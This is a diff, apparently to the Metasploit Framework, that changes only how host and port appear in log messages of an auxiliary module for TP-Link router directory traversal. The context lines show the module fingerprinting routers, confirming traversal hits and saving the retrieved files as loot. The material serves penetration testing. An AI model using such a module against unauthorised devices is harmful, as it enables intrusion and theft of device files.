@@ -64,7 +64,7 @@ class MetasploitModule < Msf::Auxiliary
     if (res and res.code == 200 and res.body !~ /\<\/HTML/)
       out = false
 
-      print_good("#{rhost}:#{rport} - Request may have succeeded on file #{file}")
+      print_good("#{Rex::Socket.to_authority(rhost, rport)} - Request may have succeeded on file #{file}")
       report_web_vuln({
         :host => rhost,
         :port => rport,
@@ -79,10 +79,10 @@ class MetasploitModule < Msf::Auxiliary
       })
 
       loot = store_loot("tplink.traversal.data", "text/plain", rhost, res.body, file)
-      vprint_good("#{rhost}:#{rport} - File #{file} downloaded to: #{loot}")
+      vprint_good("#{Rex::Socket.to_authority(rhost, rport)} - File #{file} downloaded to: #{loot}")
 
       if datastore['VERBOSE']
-        vprint_good("#{rhost}:#{rport} - Response - File #{file}:")
+        vprint_good("#{Rex::Socket.to_authority(rhost, rport)} - Response - File #{file}:")
         res.body.each_line do |line|
           # the following is the last line of the useless response
           if line.to_s =~ /\/\/--><\/SCRIPT>/
@@ -107,13 +107,13 @@ class MetasploitModule < Msf::Auxiliary
         out = false
       end
     elsif res && res.code
-      vprint_error("#{rhost}:#{rport} - File->#{file} not found")
+      vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - File->#{file} not found")
     end
   end
 
   def run_host(ip)
     begin
-      vprint_status("#{rhost}:#{rport} - Fingerprinting...")
+      vprint_status("#{Rex::Socket.to_authority(rhost, rport)} - Fingerprinting...")
       res = send_request_cgi(
         {
           'method' => 'GET',
@@ -123,7 +123,7 @@ class MetasploitModule < Msf::Auxiliary
 
       return if (res.headers['Server'].nil? or res.headers['Server'] !~ /TP-LINK Router/)
     rescue ::Rex::ConnectionError
-      vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
+      vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - Failed to connect to the web server")
       return
     end
 
